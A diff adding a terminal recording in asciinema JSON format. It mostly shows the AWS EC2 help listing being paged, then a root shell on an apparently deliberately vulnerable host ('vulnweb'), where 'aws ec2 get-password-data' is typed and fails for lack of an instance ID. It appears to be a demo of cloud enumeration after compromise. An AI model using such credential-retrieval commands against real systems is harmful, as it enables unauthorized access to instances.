+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033536,
+      "\r\u001b[K       o delete-subnet\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032753,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036744,
+      "\r\u001b[K       o delete-tags\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034127,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037285,
+      "\r\u001b[K       o delete-volume\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034056,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.04491,
+      "\r\u001b[K       o delete-vpc\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.022071,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034585,
+      "\r\u001b[K       o delete-vpc-endpoints\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042459,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.02913,
+      "\r\u001b[K       o delete-vpc-peering-connection\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.041797,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024737,
+      "\r\u001b[K       o delete-vpn-connection\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040524,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030761,
+      "\r\u001b[K       o delete-vpn-connection-route\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038818,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035039,
+      "\r\u001b[K       o delete-vpn-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.041428,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.027309,
+      "\r\u001b[K       o deregister-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.099377,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.223815,
+      "\r\u001b[K       o describe-account-attributes\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.584156,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037923,
+      "\r\u001b[K       o describe-addresses\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03251,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032823,
+      "\r\u001b[K       o describe-availability-zones\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034413,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036697,
+      "\r\u001b[K       o describe-bundle-tasks\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040474,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.029005,
+      "\r\u001b[K       o describe-classic-link-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042679,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024043,
+      "\r\u001b[K       o describe-conversion-tasks\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03827,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026673,
+      "\r\u001b[K       o describe-customer-gateways\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042782,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028396,
+      "\r\u001b[K       o describe-dhcp-options\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040973,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030149,
+      "\r\u001b[K       o describe-egress-only-internet-gateways\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034509,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034485,
+      "\r\u001b[K       o describe-elastic-gpus\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032164,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      1.046811,
+      "\r\u001b[K       o describe-export-tasks\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.583445,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033995,
+      "\r\u001b[K       o describe-flow-logs\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036823,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.039395,
+      "\r\u001b[K       o describe-fpga-image-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.023427,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036578,
+      "\r\u001b[K       o describe-fpga-images\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033656,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03129,
+      "\r\u001b[K       o describe-host-reservation-offerings\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038463,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033057,
+      "\r\u001b[K       o describe-host-reservations\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034764,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037942,
+      "\r\u001b[K       o describe-hosts\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032412,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.043018,
+      "\r\u001b[K       o describe-iam-instance-profile-associations\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026145,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040942,
+      "\r\u001b[K       o describe-id-format\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026061,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.04105,
+      "\r\u001b[K       o describe-identity-id-format\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.029531,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.031295,
+      "\r\u001b[K       o describe-image-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034402,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034443,
+      "\r\u001b[K       o describe-images\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034527,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034328,
+      "\r\u001b[K       o describe-import-image-tasks\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034906,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03476,
+      "\r\u001b[K       o describe-import-snapshot-tasks\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036682,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032101,
+      "\r\u001b[K       o describe-instance-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.044918,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026614,
+      "\r\u001b[K       o describe-instance-status\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040777,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.029946,
+      "\r\u001b[K       o describe-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032597,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035365,
+      "\r\u001b[K       o describe-internet-gateways\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035835,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.044107,
+      "\r\u001b[K       o describe-key-pairs\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.027278,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042538,
+      "\r\u001b[K       o describe-moving-addresses\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026133,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042824,
+      "\r\u001b[K       o describe-nat-gateways\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026487,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040837,
+      "\r\u001b[K       o describe-network-acls\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.025643,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037032,
+      "\r\u001b[K       o describe-network-interface-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035174,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038102,
+      "\r\u001b[K       o describe-network-interface-permissions\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038612,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040864,
+      "\r\u001b[K       o describe-network-interfaces\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024019,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042662,
+      "\r\u001b[K       o describe-placement-groups\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028527,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037878,
+      "\r\u001b[K       o describe-prefix-lists\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030852,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038871,
+      "\r\u001b[K       o describe-regions\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028689,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032176,
+      "\r\u001b[K       o describe-reserved-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036363,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036821,
+      "\r\u001b[K       o describe-reserved-instances-listings\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032326,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032517,
+      "\r\u001b[K       o describe-reserved-instances-modifications\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036699,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.044799,
+      "\r\u001b[K       o describe-reserved-instances-offerings\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.02617,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040847,
+      "\r\u001b[K       o describe-route-tables\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028178,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036782,
+      "\r\u001b[K       o describe-scheduled-instance-availability\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034842,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038366,
+      "\r\u001b[K       o describe-scheduled-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036257,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.043408,
+      "\r\u001b[K       o describe-security-group-references\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026259,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040151,
+      "\r\u001b[K       o describe-security-groups\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024272,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037224,
+      "\r\u001b[K       o describe-snapshot-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03804,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032539,
+      "\r\u001b[K       o describe-snapshots\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034518,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.0348,
+      "\r\u001b[K       o describe-spot-datafeed-subscription\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035492,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.031353,
+      "\r\u001b[K       o describe-spot-fleet-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036514,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03421,
+      "\r\u001b[K       o describe-spot-fleet-request-history\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.041462,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036577,
+      "\r\u001b[K       o describe-spot-fleet-requests\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.029964,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034478,
+      "\r\u001b[K       o describe-spot-instance-requests\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030576,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038748,
+      "\r\u001b[K       o describe-spot-price-history\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030479,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034615,
+      "\r\u001b[K       o describe-stale-security-groups\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034417,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032297,
+      "\r\u001b[K       o describe-subnets\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032513,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034839,
+      "\r\u001b[K       o describe-tags\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038599,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034688,
+      "\r\u001b[K       o describe-volume-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03638,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040969,
+      "\r\u001b[K       o describe-volume-status\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028321,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040446,
+      "\r\u001b[K       o describe-volumes\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026013,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034863,
+      "\r\u001b[K       o describe-volumes-modifications\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036357,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042844,
+      "\r\u001b[K       o describe-vpc-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028358,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032422,
+      "\r\u001b[K       o describe-vpc-classic-link\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034721,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032578,
+      "\r\u001b[K       o describe-vpc-classic-link-dns-support\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038513,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042755,
+      "\r\u001b[K       o describe-vpc-endpoint-services\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026166,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040544,
+      "\r\u001b[K       o describe-vpc-endpoints\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028635,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034212,
+      "\r\u001b[K       o describe-vpc-peering-connections\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034607,
+      "\r\u001b[K       o describe-vpcs\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038602,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034309,
+      "\r\u001b[K       o describe-vpn-connections\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.049358,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.021885,
+      "\r\u001b[K       o describe-vpn-gateways\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038727,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030059,
+      "\r\u001b[K       o detach-classic-link-vpc\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032366,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035117,
+      "\r\u001b[K       o detach-internet-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036564,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032334,
+      "\r\u001b[K       o detach-network-interface\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034625,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036382,
+      "\r\u001b[K       o detach-volume\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034708,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034562,
+      "\r\u001b[K       o detach-vpn-gateway\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034264,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036715,
+      "\r\u001b[K       o disable-vgw-route-propagation\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040912,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028228,
+      "\r\u001b[K       o disable-vpc-classic-link\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032381,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034477,
+      "\r\u001b[K       o disable-vpc-classic-link-dns-support\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038942,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032187,
+      "\r\u001b[K       o disassociate-address\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036402,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034812,
+      "\r\u001b[K       o disassociate-iam-instance-profile\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.046654,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.022281,
+      "\r\u001b[K       o disassociate-route-table\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042959,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.024598,
+      "\r\u001b[K       o disassociate-subnet-cidr-block\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.042349,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030508,
+      "\r\u001b[K       o disassociate-vpc-cidr-block\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037538,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.031454,
+      "\r\u001b[K       o enable-vgw-route-propagation\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034617,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.0346,
+      "\r\u001b[K       o enable-volume-io\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.041468,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033832,
+      "\r\u001b[K       o enable-vpc-classic-link\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040335,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.02653,
+      "\r\u001b[K       o enable-vpc-classic-link-dns-support\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036473,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03477,
+      "\r\u001b[K       o get-console-output\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034594,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032115,
+      "\r\u001b[K       o get-console-screenshot\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034662,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03292,
+      "\r\u001b[K       o get-host-reservation-purchase-preview\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036672,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034047,
+      "\r\u001b[K       o get-password-data\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03253,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036654,
+      "\r\u001b[K       o get-reserved-instances-exchange-quote\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040525,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034593,
+      "\r\u001b[K       o help\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034817,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038346,
+      "\r\u001b[K       o import-image\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.046768,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.020502,
+      "\r\u001b[K       o import-key-pair\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.045145,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.030356,
+      "\r\u001b[K       o import-snapshot\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.031664,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      1.304977,
+      "\r\u001b[K       o modify-fpga-image-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.585295,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034239,
+      "\r\u001b[K       o modify-hosts\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038685,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036297,
+      "\r\u001b[K       o modify-id-format\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040561,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028588,
+      "\r\u001b[K       o modify-identity-id-format\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038497,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028335,
+      "\r\u001b[K       o modify-image-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037447,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033852,
+      "\r\u001b[K       o modify-instance-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035403,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.033949,
+      "\r\u001b[K       o modify-instance-placement\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.038419,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032438,
+      "\r\u001b[K       o modify-network-interface-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.039288,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.03174,
+      "\r\u001b[K       o modify-reserved-instances\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.037523,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.031827,
+      "\r\u001b[K       o modify-snapshot-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.036717,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.032673,
+      "\r\u001b[K       o modify-spot-fleet-request\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035959,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.035531,
+      "\r\u001b[K       o modify-subnet-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.047992,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.01973,
+      "\r\u001b[K       o modify-volume\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.045093,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.026293,
+      "\r\u001b[K       o modify-volume-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.040699,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.028532,
+      "\r\u001b[K       o modify-vpc-attribute\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.034571,
+      "\r\u001b[K\u001b[m\r\n:\u001b[K"
+    ],
+    [
+      0.301003,
+      "\r\u001b[K\u001b[?1l\u001b>\u001b[?1049l"
+    ],
+    [
+      0.043174,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.66576,
+      "aws ec2 help"
+    ],
+    [
+      0.596658,
+      "\b\u001b[K"
+    ],
+    [
+      0.143825,
+      "\b\u001b[K"
+    ],
+    [
+      0.159556,
+      "\b\u001b[K"
+    ],
+    [
+      0.134346,
+      "\b\u001b[K"
+    ],
+    [
+      0.101382,
+      "g"
+    ],
+    [
+      0.15837,
+      "e"
+    ],
+    [
+      0.067652,
+      "t"
+    ],
+    [
+      0.180366,
+      "-"
+    ],
+    [
+      0.708088,
+      "p"
+    ],
+    [
+      0.113011,
+      "a"
+    ],
+    [
+      0.089302,
+      "s"
+    ],
+    [
+      0.181146,
+      "s"
+    ],
+    [
+      0.186058,
+      "w"
+    ],
+    [
+      0.207957,
+      "o"
+    ],
+    [
+      0.034896,
+      "r"
+    ],
+    [
+      0.255658,
+      "d"
+    ],
+    [
+      0.190955,
+      "-"
+    ],
+    [
+      0.247998,
+      "d"
+    ],
+    [
+      0.134993,
+      "a"
+    ],
+    [
+      0.058319,
+      "t"
+    ],
+    [
+      0.12142,
+      "a"
+    ],
+    [
+      0.132776,
+      "\r\n"
+    ],
+    [
+      0.316622,
+      "usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]\r\nTo see help text, you can run:\r\n\r\n  aws help\r\n  aws <command> help\r\n  aws <command> <subcommand> help\r\naws: error: argument --instance-id is required\r\n"
+    ],
+    [
+      0.037876,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "exit\r\n"
+    ],
+    [
+      0.051525,
+      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ]
+  ]
+}
